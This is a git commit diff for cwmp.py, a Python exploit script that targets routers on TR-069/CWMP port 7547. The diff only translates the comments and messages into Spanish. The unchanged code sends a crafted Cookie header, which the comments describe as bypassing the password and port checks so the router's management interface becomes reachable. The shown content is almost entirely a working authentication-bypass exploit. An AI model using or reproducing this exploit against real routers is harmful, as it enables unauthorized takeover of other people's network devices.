c7c0f113a9bbe21aafb135d1e53be55d98f0ab24
hackingyseguridad <hackingyseguridad@hackingyseguridad.com>
2016-11-29 23:32:07 +0100

    Update cwmp.py

--- cwmp.py
+++ cwmp.py
@@ -7,16 +7,16 @@ PORT="7547"
 class exploit:
  
     def run(self, router_ip):
-        #Bypass the CWMP port check. Bypass the password check
+        #Saltando la password
         headers = {"Cookie": "C88605=AAAAAAAA;C107257012=\x08\x0b\x27\x19\x66\x40\xb0\x21;C107257012=\x08\x0b\x27\x19"}  
  
         req = requests.get("http://" + router_ip +":" + PORT + "/",  headers = headers)
         if (req.status_code == 200):
-            print("The exploit was sent successfully. Try accessing the management interface on port " + PORT)
+            print("Intentando acceder al puerto:" + PORT)
  
 if __name__ == "__main__":
     if len(sys.argv) != 2:
-        print("Please supply an ip address")
+        print("IP ")
         exit()
  
     router_ip = sys.argv[1]
